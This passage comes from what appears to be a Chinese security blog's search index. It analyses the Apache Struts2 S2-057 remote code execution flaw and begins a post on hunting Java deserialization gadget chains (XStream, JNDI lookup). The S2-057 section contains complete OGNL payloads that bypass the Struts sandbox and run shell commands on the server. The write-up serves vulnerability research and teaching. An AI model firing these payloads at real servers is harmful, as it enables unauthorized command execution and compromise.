<p>\u5177\u4f53\u5206\u6790\u89c1http://xxlegend.com/2017/12/06/S2-055%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%88%86%E6%9E%90/</p>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#19-s2-057","title":"19. S2-057","text":"<p>\u5f71\u54cd\u8303\u56f4\uff1aStruts 2.0.4 - Struts 2.3.34, Struts 2.5.0 - Struts 2.5.16</p> <p>\u5317\u4eac\u65f6\u95f48\u670822\u65e513\u65f6\uff0cApache\u5b98\u65b9\u53d1\u5e03\u901a\u544a\u516c\u5e03\u4e86Struts2\u4e2d\u4e00\u4e2a\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff08CVE-2018-11776\uff09\u3002\u8be5\u6f0f\u6d1e\u5728\u4e24\u79cd\u60c5\u51b5\u4e0b\u5b58\u5728\uff0c\u7b2c\u4e00\uff0c\u5728xml\u914d\u7f6e\u4e2d\u672a\u8bbe\u7f6enamespace\u503c\uff0c\u4e14\u4e0a\u5c42\u52a8\u4f5c\u914d\u7f6e\uff08upper action(s) configurations\uff09\u4e2d\u672a\u8bbe\u7f6e\u6216\u7528\u901a\u914d\u7b26namespace\u503c\u3002\u7b2c\u4e8c\uff0c\u4f7f\u7528\u672a\u8bbe\u7f6e value\u548caction\u503c\u7684url\u6807\u7b7e\uff0c\u4e14\u4e0a\u5c42\u52a8\u4f5c\u914d\u7f6e\uff08upper action(s) configurations\uff09\u4e2d\u672a\u8bbe\u7f6e\u6216\u7528\u901a\u914d\u7b26namespace\u503c\u3002</p> <p>https://paper.seebug.org/682/</p> <p>\u8fd9\u91cc\u4e00\u79cd\u914d\u7f6e\u65b9\u6848\u662f</p> <p></p> <p>\u6ca1\u6709\u914d\u7f6enamespace\uff0c\u8bbf\u95ees2057.action\u90fd\u4f1a\u5bfc\u5411test.action\uff0c\u8fd9\u91cc\u5904\u7406redirectAction\u7684\u662f</p> <p></p> <p><code>org.apache.struts2.dispatcher.ServletActionRedirectResult#execute</code></p> <p></p> <p><code>ServletActionRedirectResult</code>\u4f1a\u5c06namespace\u4e00\u8d77\u62fc\u63a5\u8fdblocation\uff0c\u6bd4\u5982<code>/s2vuls/${1*2}/s2057.action</code>,\u5176namespace\u4e3a<code>/${1*2}</code>,actionName\u4e3a\u8df3\u8f6c\u7684test\uff0c\u6700\u7ec8location\u4e3a<code>/${1*2}/test.action</code>\u3002\u5230\u8fd9\u91cc\u6211\u4eec\u5c31\u5f15\u5165\u4e86OGNL\u8868\u8fbe\u5f0f\uff0c\u770b\u540e\u7eed\u7684\u4e00\u4e2a\u5904\u7406</p> <p><code>org.apache.struts2.dispatcher.StrutsResultSupport#execute</code></p> <p></p> <p>\u5230\u8fd9\u91cc\uff0c\u5c31\u5f00\u59cb\u719f\u6089\u8d77\u6765\u4e86\uff0c\u5c31\u662fS2-012\u7684\u6f0f\u6d1e\u89e6\u53d1\u70b9</p> <p></p> <p>\u4f20\u5165\u4e86<code>TextParseUtil.translateVariables</code>\uff0c\u5230\u8fd9\u91cc\u5c31\u7ed3\u675f\u4e86\uff0c\u540e\u7eed\u5c06\u8c03\u7528OGNL.getValue</p>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#poc_16","title":"POC","text":"<p>\u57282.3.x\u7248\u672c\uff0c\u53ef\u4ee5\u76f4\u63a5\u7528S2-045\u7684poc\u6253</p> <pre><code>/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23cmd%3D%27whoami%27%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27/bin/bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%29.%28@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D/s2057.action\n</code></pre> <p>\u800c\u5bf9\u4e8e2.5.x\u7248\u672c\uff0c\u6211\u4eec\u9700\u8981\u597d\u597d\u5206\u6790\u4e00\u4e0b</p> <pre><code>${\n(#ct=#request['struts.valueStack'].context).\n(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).\n(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).\n(#ou.setExcludedClasses('')).\n(#ou.setExcludedPackageNames('')).\n(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).\n(#ct.setMemberAccess(#dm)).(#cmd='whoami').\n(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).\n(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/bash','-c',#cmd})).\n(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).\n(#process=#p.start()).\n(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).\n(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())\n}\n</code></pre> <p>\u4ecepoc\u6765\u770b\uff0c\u4ece\u7b2c7\u884c\u5f00\u59cb\u90fd\u662f\u6211\u4eec\u719f\u6089\u7684\u64cd\u4f5c\uff0c\u90a3\u4e48\u524d\u9762\u591a\u4e86\u90a3\u4e48\u591a\u662f\u5728\u505a\u4ec0\u4e48\uff1f</p> <p>\u53c2\u8003\uff1ahttps://paper.seebug.org/794/#35-struts-2516</p> <p>\u5728struts2 2.5.13\u7248\u672c\u4e4b\u540e\uff0cognl\u5e93\u8fdb\u884c\u4e86\u66f4\u65b0\uff0c\u4ece3.1.12-&gt;3.1.15\uff0c\u5176\u4e3b\u8981\u7684\u4e00\u4e2a\u53d8\u5316\u662f\u7981\u6b62\u8bbf\u95ee<code>context.map</code>\uff0cOgnlContext\u7684get\u3001put\u3001remove\u51fd\u6570\u4e2d\u90fd\u5220\u9664\u4e86\u5bf9\u5f53\u524dcontext\u7684\u64cd\u4f5c</p> <p>\u6b64\u5916\uff0cexcluded\u76f8\u5173\u7684\u96c6\u5408\u88ab\u8bbe\u7f6e\u4e3a\u4e0d\u53ef\u53d8\uff0c\u65e0\u6cd5\u901a\u8fc7clear\u7684\u65b9\u5f0f\u6765\u6e05\u9664</p> <p>\u9488\u5bf9\u4e0a\u9762\u4e24\u79cd\u7684\u7ed5\u8fc7</p> <p>\u6587\u7ae0\u63d0\u51fa\u4e86\u8fd9\u4e48\u4e00\u79cd\u601d\u8def:</p> <ul> <li>\u6ca1\u6709\u529e\u6cd5\u4f7f\u7528<code>context.map</code>\uff0c\u53ef\u4ee5\u8c03\u7528<code>attr</code>\uff0c\u524d\u6587\u8bf4\u8fc7<code>attr</code>\u4e2d\u4fdd\u5b58\u7740\u6574\u4e2a<code>context</code>\u7684\u53d8\u91cf\u4e0e\u65b9\u6cd5\uff0c\u53ef\u4ee5\u901a\u8fc7<code>attr</code>\u4e2d\u7684\u65b9\u6cd5\u8fd4\u56de\u7ed9\u6211\u4eec\u4e00\u4e2a<code>context.map</code>\u3002</li> <li>\u6ca1\u6709\u529e\u6cd5\u76f4\u63a5\u8c03\u7528<code>excludedClasses</code>\uff0c\u4e5f\u5c31\u4e0d\u80fd\u4f7f\u7528<code>clear</code>\u65b9\u6cd5\u6765\u6e05\u7a7a\uff0c\u4f46\u662f\u8fd8\u53ef\u4ee5\u5229\u7528<code>setter</code>\u6765\u628a<code>excludedClasses</code>\u7ed9\u8bbe\u7f6e\u6210\u7a7a</li> <li>\u6e05\u7a7a\u4e86\u9ed1\u540d\u5355\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5229\u7528<code>DefaultMemberAccess</code>\u6765\u8986\u76d6<code>_memberAccess</code>\uff0c\u6765\u6267\u884c\u9759\u6001\u65b9\u6cd5\u4e86\u3002</li> </ul> <p>\u800c\u8fd9\u91cc\u53c8\u4f1a\u51fa\u73b0\u4e00\u4e2a\u95ee\u9898\uff0c\u5f53\u6211\u4eec\u4f7f\u7528<code>OgnlUtil</code>\u7684<code>setExcludedClasses</code>\u548c<code>setExcludedPackageNames</code>\u5c06\u9ed1\u540d\u5355\u7f6e\u7a7a\u65f6\u5e76\u975e\u662f\u5bf9\u4e8e\u6e90\uff08\u5168\u5c40\u7684OgnlUtil\uff09\u8fdb\u884c\u7f6e\u7a7a\uff0c\u4e5f\u5c31\u662f\u8bf4<code>_memberAccess</code>\u662f\u6e90\u6570\u636e\u7684\u4e00\u4e2a\u5f15\u7528\uff0c\u5c31\u50cf\u524d\u6587\u6240\u8bf4\u7684\uff0c\u5728\u6bcf\u6b21<code>createAction</code>\u65f6\u90fd\u662f\u901a\u8fc7<code>setOgnlUtil</code>\u5229\u7528\u5168\u5c40\u7684\u6e90\u6570\u636e\u521b\u5efa\u4e00\u4e2a\u5f15\u7528\uff0c\u8fd9\u4e2a\u5f15\u7528\u5c31\u662f\u4e00\u4e2a<code>MemberAccess</code>\u5bf9\u8c61\uff0c\u4e5f\u5c31\u662f<code>_memberAccess</code>\u3002\u6240\u4ee5\u8fd9\u91cc\u53ea\u4f1a\u5f71\u54cd\u8fd9\u6b21\u8bf7\u6c42\u7684<code>OgnlUtil</code>\u800c\u5e76\u672a\u91cd\u65b0\u521b\u5efa\u4e00\u4e2a\u65b0\u7684<code>_memberAccess</code>\u5bf9\u8c61\uff0c\u6240\u4ee5\u65e7\u7684<code>_memberAccess</code>\u5bf9\u8c61\u4ecd\u672a\u6539\u53d8\u3002</p> <p>\u800c\u7a81\u7834\u8fd9\u79cd\u9650\u5236\u7684\u65b9\u5f0f\u5c31\u662f\u518d\u6b21\u53d1\u9001\u4e00\u4e2a\u8bf7\u6c42\uff0c\u5c06\u4e0a\u4e00\u6b21\u8bf7\u6c42\u5df2\u7ecf\u7f6e\u7a7a\u7684<code>OgnlUitl</code>\u4f5c\u4e3a\u6e90\u91cd\u65b0\u521b\u5efa\u4e00\u4e2a<code>_memberAccess</code>\uff0c\u8fd9\u6837\u5728\u7b2c\u4e8c\u6b21\u8bf7\u6c42\u4e2d<code>_memberAccess</code>\u5c31\u662f\u9ed1\u540d\u5355\u88ab\u7f6e\u7a7a\u7684\u60c5\u51b5\uff0c\u8fd9\u4e2a\u65f6\u5019\u5c31\u91ca\u653e\u4e86<code>DefaultMemberAccess</code>\uff0c\u5c31\u53ef\u4ee5\u8fdb\u884c\u6b63\u5e38\u7684\u8986\u76d6\u4ee5\u53ca\u6267\u884c\u9759\u6001\u65b9\u6cd5\u3002</p> <p>\u770b\u8fc7\u4e0a\u9762\u7684\u5206\u6790\u540e\u518d\u6765\u770bpoc\uff0c\u7b2c\u4e8c\u884c\u83b7\u53d6\u4e86context\uff0c\u7b2c3 4 5 6\u884c\u6e05\u9664\u4e86excluded\u76f8\u5173\u7684\u96c6\u5408\uff0c\u4f46\u5176\u5f53\u524d\u7684\u8bf7\u6c42\u9ed1\u540d\u5355\u8fd8\u662f\u5b58\u5728\u7684\uff0c\u6240\u4ee5\u57282.5.x\u7248\u672c\u6211\u4eec\u9700\u8981\u53d1\u9001\u4e24\u6b21\u8fd9\u4e2apoc\uff0c\u7b2c\u4e00\u6b21\u6e05\u695a\u9ed1\u540d\u5355\uff0c\u7b2c\u4e8c\u6b21\u8986\u76d6<code>_memberAccess</code>\u5e76\u8c03\u7528\u9759\u6001\u51fd\u6570</p>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#0x03","title":"0x03 \u603b\u7ed3","text":"<p>\u5728\u5206\u6790\u8fc7\u7a0b\u4e2d\uff0c\u53c2\u8003\u4e86\u5f88\u591a\u5e08\u5085\u4eec\u7684\u7b14\u8bb0\uff0c\u8fd9\u91cc\u7279\u522b\u611f\u8c22\u4e00\u4e0bXD</p> <p>\u4ece\u6574\u4e2as2\u6f0f\u6d1e\u7684\u5386\u7a0b\u6765\u770b\uff0c\u80fd\u770b\u5230\u5f88\u591a\u6f0f\u6d1e\u5176\u5b9e\u5229\u7528\u70b9\u662f\u76f8\u4f3c\u7684\uff0c\u53ea\u662f\u8bf4\u4ece\u54ea\u4e2a\u5165\u53e3\u8fdb\u53bb\u53ef\u80fd\u6709\u6240\u4e0d\u540c\u3002\u8fd9\u79cd\u6f0f\u6d1e\u7684\u5206\u6790\u6211\u8ba4\u4e3a\u7528\u6570\u636e\u6d41\u5206\u6790\u662f\u975e\u5e38\u5408\u9002\u7684\u3002lgtm\u7684\u5e08\u5085\u5c31\u7528\u4e86\u4ed6\u4eec\u7684codeql\u53d1\u73b0\u4e86S2-057\u8fd9\u4e2a\u6f0f\u6d1e\u3002</p> <p>\u4f46\u662f\u5b98\u65b9\u5728\u4e00\u6b21\u6b21\u4fee\u590d\u4e2d\uff0c\u5bf9\u4e8eognl\u8868\u8fbe\u5f0f\u7684\u6267\u884c\u9650\u5236\u7684\u8d8a\u6765\u8d8a\u591a\uff0c\u4f7f\u5f97\u5982\u4eca\u5c31\u7b97\u51fa\u73b0ognl\u8868\u8fbe\u5f0f\u6ce8\u5165\u4e5f\u5f88\u96be\u9020\u6210RCE\u7684\u6548\u679c\u3002</p> <p>\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u770blucifaer\u5e08\u5085\u7684\u90a3\u7bc7\u6587\u7ae0</p> <p>\u4ece\u65f6\u95f4\u7ebf\u6765\u770b\uff0c</p> <ol> <li>struts2 2.3.14.1\u4e4b\u524d\uff0cognl\u8868\u8fbe\u5f0f\u6267\u884c\u6ca1\u6709\u4ec0\u4e48\u969c\u788d\uff1b2.3.14.1\u589e\u52a0\u4e86<code>SecurityMemberAccess</code>\uff0c\u7981\u6b62\u9759\u6001\u51fd\u6570\u6267\u884c<code>allowStaticMethodAccess=false</code>\uff0c\u5728ognl\u8868\u8fbe\u5f0f\u91cc\u9762\u53ef\u4ee5\u91cd\u65b0\u7f6e\u4e3atrue\uff1b\u540e\u7eed\u8fd9\u4e2a\u503c\u88ab\u6539\u6210\u4e86final\uff0c\u65e0\u6cd5\u88ab\u66f4\u6539</li> <li>struts2 2.3.20\u4e4b\u524d\uff0c\u867d\u7136\u4e0d\u80fd\u6539<code>allowStaticMethodAccess</code>\uff0c\u4f46\u662f\u53ef\u4ee5\u901a\u8fc7\u6784\u9020\u51fd\u6570\u7684\u65b9\u5f0f\u7ed5\u8fc7\uff1b2.3.20\u4e4b\u540e\uff0c\u589e\u52a0\u4e86\u9ed1\u540d\u5355</li> <li>struts2 2.3.29\u4e4b\u524d\uff0c\u901a\u8fc7<code>#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS</code>\u8fd9\u79cd\u65b9\u5f0f\u521d\u59cb\u5316\uff0c\u6e05\u7a7a\u9ed1\u540d\u5355\uff1b2.3.29\u4e4b\u540e\uff0c\u65b0\u589e\u4e86\u9ed1\u540d\u5355\uff0c\u9650\u5236\u4e86\u8fd9\u79cd\u65b9\u5f0f\u7684\u6267\u884c</li> <li>struts2 2.3.34/2.5.16\u4e4b\u524d\uff0c\u901a\u8fc7container\u5b9e\u4f8b\u5316<code>ognlUtil</code>\uff0c\u6e05\u7a7a\u9ed1\u540d\u5355\uff0c\u8be6\u7ec6\u89c1S2-045\uff1b\u4e4b\u540e\u7981\u6b62\u4e86context.map\u7684\u8bbf\u95ee\u548cexcludedClasses\u4e0d\u53ef\u53d8\uff0c\u4e0d\u80fd\u901a\u8fc7clear\u6e05\u695a</li> <li>struts2 2.5.17\u4e4b\u524d\uff0c\u901a\u8fc7request\u4e2d\u83b7\u53d6context\uff0c\u7ed5\u8fc7context.map\u7981\u6b62\u8bbf\u95ee\u7684\u9650\u5236\uff0c\u8be6\u7ec6\u89c1S2-057\uff1b\u4e4b\u540e\u65b0\u589e\u4e86\u9ed1\u540d\u5355\uff0c\u5b8c\u5168\u7981\u6b62\u901a\u8fc7ognl\u7684\u5305\u6765\u5bf9stack\u505a\u64cd\u4f5c</li> <li>\u540e\u7eed\u51e0\u4e2a\u7248\u672c\u4e5f\u66f4\u65b0\u4e86\u5f88\u591a\u5b89\u5168\u63aa\u65bd\uff0c\u5177\u4f53\u89c1lucifaer\u5e08\u5085\u7684\u6587\u7ae0</li> </ol> <p>\u5728\u5206\u6790\u5b8cstruts2\u4e4b\u540e\uff0c\u4e5f\u6539\u53d8\u4e86\u5bf9\u5f88\u6709\u540d\u7684\u6f0f\u6d1e\u7684\u611f\u5b98\uff0c\u4ee5\u524d\u603b\u89c9\u5f97struts\u6f0f\u6d1e\u90fd\u662f\u6bd4\u8f83\u590d\u6742\u7684\uff0c\u4f46\u662f\u73b0\u5728\u60f3\u60f3\u6709\u7cbe\u5f69\u590d\u6742\u7684\u5730\u65b9\u4e5f\u4f1a\u6709\u5f88\u50bb\u7684\u5730\u65b9\u3002</p> <p>\u4e0d\u80fd\u5bf9\u8fd8\u6ca1\u6709\u5206\u6790\u8fc7\u7684\u6846\u67b6\u6216\u8005\u5e94\u7528\u6301\u6709\u754f\u60e7\u4e4b\u5fc3\uff0c\u5171\u52c9XD</p>","tags":["Java"]},{"location":"blog/2021/how_to_find_gadget_chains/","title":"\u5982\u4f55\u9ad8\u6548\u7684\u6316\u6398Java\u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe\uff1f","text":"","tags":["Java"]},{"location":"blog/2021/how_to_find_gadget_chains/#1","title":"#1 \u524d\u8a00","text":"<p>Java\u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe\u4e00\u76f4\u90fd\u662f\u56fd\u5185\u5916\u7814\u7a76\u70ed\u70b9\u4e4b\u4e00\uff0c\u4f46\u5f53\u524d\u81ea\u52a8\u5316\u65b9\u6848gadgetinspector\u7684\u6548\u679c\u5e76\u4e0d\u597d\u3002\u6240\u4ee5\u76ee\u524d\u591a\u6570\u5e08\u5085\u4ecd\u7136\u662f\u4ee5\u4eba\u5de5+\u81ea\u7814\u5c0f\u5de5\u5177\u7684\u65b9\u5f0f\u8fdb\u884c\u5229\u7528\u94fe\u7684\u6316\u6398\u3002\u76ee\u524d\u6211\u4e2a\u4eba\u4e5f\u5728\u627e\u4e00\u4e2a\u5408\u9002\u7684\u65b9\u6cd5\u6765\u9ad8\u6548\u6316\u6398\u5229\u7528\u94fe\uff0c\u672c\u6587\u5c06\u4e3b\u8981\u4ecb\u7ecd\u6211\u81ea\u5df1\u7684\u4e00\u4e9b\u6316\u6398\u5fc3\u5f97\uff0c\u8f85\u4ee5XStream\u53cd\u5e8f\u5217\u5316\u5229\u7528\u94feCVE-2021-21346\u4e3a\u4f8b\u3002</p>","tags":["Java"]},{"location":"blog/2021/how_to_find_gadget_chains/#1_1","title":"#1 \u524d\u7f6e\u77e5\u8bc6","text":"<p>\u8fd9\u91cc\u524d\u7f6e\u77e5\u8bc6\u4e3b\u8981\u6709\u4e24\u7c7b\uff1aXStream\u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe\u7684\u539f\u7406\u548c\u56fe\u6570\u636e\u5e93\u67e5\u8be2\u8bed\u6cd5</p> <ol> <li>XStream\u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe\u539f\u7406</li> </ol> <p>\u8fd9\u91cc\u5177\u4f53\u7684\u539f\u7406\u53ef\u4ee5\u89c1\u56de\u987eXStream\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff0c\u8fd9\u91cc\u6211\u4eec\u53ea\u9700\u77e5\u9053XStream\u5728\u53cd\u5e8f\u5217\u5316\u7684\u8fc7\u7a0b\u4e2d\u5b83\u7684\u9650\u5236\u662f\u5f88\u5c11\u7684\uff08\u4e0d\u7528PureJavaReflectionProvider\uff09\uff0c\u5b83\u751a\u81f3\u80fd\u8fd8\u539f\u6784\u9020\u597d\u7684Method\u5bf9\u8c61\u3002\u6240\u4ee5\u8fd9\u91cc\u6211\u4eec\u9700\u8981\u6e05\u695a\u7684\u662f\u5b83\u7684\u89e6\u53d1\u51fd\u6570source\u662f\u4ec0\u4e48\uff0c\u770b\u6211\u4e0a\u9762\u90a3\u7bc7\u6587\u7ae0\u80fd\u77e5\u9053\u5171\u6709hashCode\u51fd\u6570\uff08Map\u65b9\u5f0f\uff09\u3001compareTo\u51fd\u6570\uff08TreeSet\u65b9\u5f0f\uff09\u3001compare\u51fd\u6570\uff08PriorityQueue\u65b9\u5f0f\uff09\u3002</p> <ol> <li>\u56fe\u6570\u636e\u5e93\u67e5\u8be2\u8bed\u6cd5</li> </ol> <p>\u8fd9\u91cc\u7528\u5230\u4e86\u6211\u5373\u5c06\u5f00\u6e90\u7684\u5de5\u5177tabby\uff0c\u8be5\u5de5\u5177\u5c06jar\u6587\u4ef6\u8f6c\u5316\u4e3a\u4ee3\u7801\u5c5e\u6027\u56fe\uff0c\u7136\u540e\u540e\u7eed\u6211\u4eec\u53ef\u4ee5\u7528neo4j\u7684\u56fe\u6570\u636e\u5e93\u67e5\u8be2\u8bed\u6cd5\u8fdb\u884c\u5229\u7528\u94fe\u7684\u67e5\u627e\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u6709\u4e00\u5b9a\u7684\u56fe\u6570\u636e\u5e93\u67e5\u8be2\u8bed\u6cd5\u7684\u57fa\u7840</p>","tags":["Java"]},{"location":"blog/2021/how_to_find_gadget_chains/#2","title":"#2 \u5229\u7528\u94fe\u6316\u6398","text":"<p>\u9996\u5148\u672c\u6b21\u9488\u5bf9\u7684\u662fJDK\u76f8\u5173Jar\u6587\u4ef6\u7684\u5229\u7528\u94fe\u68c0\u6d4b\u5206\u6790\uff0c\u6240\u4ee5\u5148\u4f7f\u7528tabby\u751f\u6210JDK\u76f8\u5173\u7684\u4ee3\u7801\u5c5e\u6027\u56fe\u81f3\u56fe\u6570\u636e\u5e93\u3002\u6267\u884c\u5b8c\u4ee5\u4e0b\u4e24\u53e5\u547d\u4ee4\uff0c\u53ef\u4ee5\u751f\u6210\u4e00\u4e2a28w\u6570\u636e\u8282\u70b9\uff0c76w\u5173\u7cfb\u8fb9\u7684\u4ee3\u7801\u5c5e\u6027\u56fe\uff1a</p> <pre><code># \u751f\u6210\u56fe\u7f13\u5b58\u6587\u4ef6\njava -Xmx6g -jar target/tabby-1.0.0-SNAPSHOT.jar --isJDKOnly\n# \u5bfc\u5165Neo4j\u56fe\u6570\u636e\njava -Xmx6g -jar target/tabby-1.0.0-SNAPSHOT.jar --isSaveOnly\n</code></pre> <p>\u63a5\u4e0b\u6765\uff0c\u6784\u9020\u56fe\u67e5\u8be2\u8bed\u8a00\uff0c\u8fd9\u91cc\u63d0\u4f9b\u4e00\u4e2a\u6a21\u7248</p> <pre><code>match (source:Method) // \u6dfb\u52a0where\u8bed\u53e5\u9650\u5236source\u51fd\u6570\nmatch (sink:Method {IS_SINK:true}) // \u6dfb\u52a0where\u8bed\u53e5\u9650\u5236sink\u51fd\u6570\ncall apoc.algo.allSimplePaths(m1, source, \"&lt;CALL|ALIAS\", 12) yield path // \u67e5\u627e\u5177\u4f53\u8def\u5f84,12\u4ee3\u8868\u6df1\u5ea6\uff0c\u53ef\u4ee5\u4fee\u6539\nreturn * limit 20\n</code></pre> <p>\u5f53\u524d\u6211\u4eec\u5df2\u7ecf\u786e\u5b9a\u4e86\u5f53\u524d\u53ef\u4ee5\u4f7f\u7528hashCode\u51fd\u6570\u3001compareTo\u51fd\u6570\u3001compare\u51fd\u6570\u4f5c\u4e3asource\u51fd\u6570\uff0c\u90a3\u4e48\u53ea\u8981\u518d\u9650\u5236sink\u51fd\u6570\u5373\u53ef\uff0c\u5982\u4e0b\u67e5\u8be2\u8bed\u53e5</p> <pre><code>match (source:Method {NAME:\"compare\"})\nmatch (sink:Method {IS_SINK:true, NAME:\"invoke\"})&lt;-[:CALL]-(m1:Method)\ncall apoc.algo.allSimplePaths(m1, source, \"&lt;CALL|ALIAS\", 12) yield path \nreturn * limit 20\n</code></pre> <p>\u672c\u6b21\u5229\u7528\u94fe\u5c06\u9650\u5236\u5371\u9669\u51fd\u6570\u4e3aMethod.invoke\u51fd\u6570\uff0c\u5177\u4f53\u67e5\u8be2\u7ed3\u679c\u5982\u4e0b\u56fe\u6240\u793a</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u672b\u7aef\u7684\u5371\u9669\u51fd\u6570\u8c03\u7528\u70b9\u4e3a<code>sun.swing.SwingLazyValue#createValue</code>\uff0c\u6765\u770b\u4e00\u4e0b\u5177\u4f53\u7684\u4ee3\u7801</p> <pre><code>public Object createValue(final UIDefaults table) {\n    try {\n        ReflectUtil.checkPackageAccess(className);\n        Class&lt;?&gt; c = Class.forName(className, true, null);\n        if (methodName != null) {\n            Class[] types = getClassArray(args);\n            Method m = c.getMethod(methodName, types);\n            makeAccessible(m);\n            return m.invoke(c, args);\n        } else {\n            Class[] types = getClassArray(args);\n            Constructor constructor = c.getConstructor(types);\n            makeAccessible(constructor);\n            return constructor.newInstance(args);\n        }\n    } catch (Exception e) {\n        // Ideally we would throw an exception, unfortunately\n        // often times there are errors as an initial look and\n        // feel is loaded before one can be switched. Perhaps a\n        // flag should be added for debugging, so that if true\n        // the exception would be thrown.\n    }\n    return null;\n}\n</code></pre> <p>\u4ece\u4ee3\u7801\u4e0a\u770b\uff0c\u8be5\u51fd\u6570\u53ef\u4ee5\u8c03\u7528\u4efb\u610f\u7684\u9759\u6001\u51fd\u6570\u6216\u4efb\u610f\u5bf9\u8c61\u7684\u6784\u9020\u51fd\u6570\u3002\u90a3\u4e48\u6211\u4eec\u5c31\u5148\u786e\u5b9a\u5f53\u524d\u8fd9\u4e2a\u51fd\u6570\u662f\u5426\u662f\u53ef\u7528\u7684\uff0c\u5373\u627e\u5230\u5408\u9002\u7684\u9759\u6001\u51fd\u6570\u6216\u6784\u9020\u51fd\u6570\uff0c\u8be5\u51fd\u6570\u4f1a\u8c03\u7528\u67d0\u4e9b\u5371\u9669\u51fd\u6570\u4ece\u800c\u8fbe\u6210\u4ee3\u7801\u6267\u884c\u6216\u547d\u4ee4\u6267\u884c\u3002\u8fd9\u91cc\u4e5f\u540c\u6837\u6784\u9020\u56fe\u67e5\u8be2\u8bed\u53e5\u8fdb\u884c\u5408\u9002\u51fd\u6570\u7684\u67e5\u627e\uff0c\u6682\u65f6\u9650\u5b9a\u5371\u9669\u51fd\u6570\u4e3a<code>exec</code>\u3001<code>lookup</code>\u3001<code>invoke</code>\u3002</p> <p></p> <p>\u627e\u5230\u4e86\u4e00\u4e2a\u53ef\u4ee5\u7528\u7684\u51fd\u6570<code>&lt;javax.naming.InitialContext: java.lang.Object doLookup(java.lang.String)&gt;</code>\uff0c\u8be5\u9759\u6001\u51fd\u6570\u53ef\u4ee5\u8fdb\u884cJNDI\u6ce8\u5165\u653b\u51fb\u3002</p> <p>\u6240\u4ee5\u5230\u8fd9\u91cc\u6211\u4eec\u5c31\u80fd\u786e\u5b9a\u5f53\u524d\u7684<code>sun.swing.SwingLazyValue#createValue</code>\u662f\u53ef\u4ee5\u5229\u7528\u7684\u8282\u70b9\u3002</p> <p>\u90a3\u4e48\u6839\u636e\u524d\u4e00\u4e2a\u67e5\u8be2\u7ed3\u679c\uff0c\u6211\u4eec\u7ee7\u7eed\u8fdb\u884c\u5206\u6790<code>javax.swing.UIDefaults#getFromHashtable</code>\u3002</p> <pre><code>private Object getFromHashtable(final Object key) {\n        /* Quickly handle the common case, without grabbing\n         * a lock.\n         */\n        Object value = super.get(key);\n\n            // ...\n\n        /* At this point we know that the value of key was\n         * a LazyValue or an ActiveValue.\n         */\n        if (value instanceof LazyValue) {\n            try {\n                /* If an exception is thrown we'll just put the LazyValue\n                 * back in the table.\n                 */\n                value = ((LazyValue)value).createValue(this);\n            }\n         // ...\n    }\n</code></pre> <p><code>javax.swing.UIDefaults</code>\u662f<code>Hashtable&lt;Object,Object&gt;</code>\u7684\u53e6\u4e00\u4e2a\u5b9e\u73b0\uff0c\u6240\u4ee5\u8fd9\u91cc<code>super.get(key)</code>\u83b7\u53d6\u5230\u7684value\u503c\u5bf9\u4e8e\u6211\u4eec\u6765\u8bf4\u662f\u53ef\u4ee5\u4efb\u610f\u586b\u5145\u7684\uff0c\u90a3\u4e48\u6b64\u5904\u586b\u5145\u524d\u9762\u7684<code>sun.swing.SwingLazyValue</code>\u5bf9\u8c61\u5373\u53ef\u89e6\u53d1<code>createValue</code>\u51fd\u6570\u7684\u8c03\u7528\u3002</p> 